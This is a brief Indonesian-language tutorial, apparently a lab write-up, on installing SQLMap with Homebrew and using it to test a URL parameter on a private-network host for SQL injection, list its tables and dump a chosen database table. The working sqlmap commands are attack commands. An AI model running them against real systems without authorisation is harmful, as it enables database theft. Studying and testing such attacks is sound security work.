# Pengujian SQL Injection Menggunakan SQLMap
## Instalasi SQLMap menggunakan Homebrew
Lakukan instalasi `brew install sqlmap`
![](/assets/sqlmap/1.png)
## Pengujian SQL Injection menggunakan SQLMap
1. Untuk melakukan pengecekan pada parameter, apakah mengandung vulnerable `sqlmap --url="http://10.151.36.103/?match=1" --level 5 --risk 3 --dbms mysql`
![](/assets/sqlmap/2.png)
2. `sqlmap --url "http://10.151.36.103/?match=1" --dump -D [database yang diinginkan] -T [tabel yang diinginkan]`
![](/assets/sqlmap/3.png)
3. `sqlmap --url "http://10.151.36.103/?match=1" --tables`
![](/assets/sqlmap/4.png)



